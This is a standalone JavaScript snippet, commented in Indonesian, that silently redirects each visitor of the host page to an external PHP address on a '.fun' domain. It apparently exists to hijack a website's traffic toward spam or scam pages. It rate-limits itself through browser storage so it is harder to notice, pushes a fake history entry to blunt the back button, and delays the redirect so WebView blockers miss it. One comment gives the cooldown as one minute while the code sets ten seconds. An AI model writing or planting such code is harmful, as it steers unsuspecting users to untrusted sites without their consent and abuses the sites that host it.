(function () {
  try {
    // === SETTING ===
    var target = "https://vidoy.fun/cB6Tyq0.php"; // tujuan redirect
    var cooldownMs = 10 * 1000;                   // 1 menit (ubah sesuai kebutuhan)
    // =================

    if (!/^https:\/\//i.test(target)) return;

    // bypass manual: ?noredir=1 atau #noredir
    if (/[?#](?:.*[&?])?noredir=1/i.test(location.search + location.hash)) return;

    var page = location.origin + location.pathname;
    var sessKey = "redir_seen:" + page + "|" + target;
    var cdKey   = "redir_cd:" + page + "|" + target;

    var now = Date.now();

    // anti-loop per tab
    if (sessionStorage.getItem(sessKey)) return;

    // cek cooldown global
    var until = parseInt(localStorage.getItem(cdKey) || "0", 10);
    if (now < until) return;

    // lock supaya tidak retrigger
    sessionStorage.setItem(sessKey, "1");
    localStorage.setItem(cdKey, String(now + cooldownMs));

    // tambahkan bantalan history biar tab nggak “hilang” saat balik
    try { history.pushState({ hold: 1 }, "", location.href); } catch (_) {}

    // redirect (dengan delay kecil supaya WebView tidak blok)
    setTimeout(function () {
      try { location.href = target; } catch (_) {}
    }, 150);

  } catch (e) {
    console.error("Redirect error:", e);
  }
})();
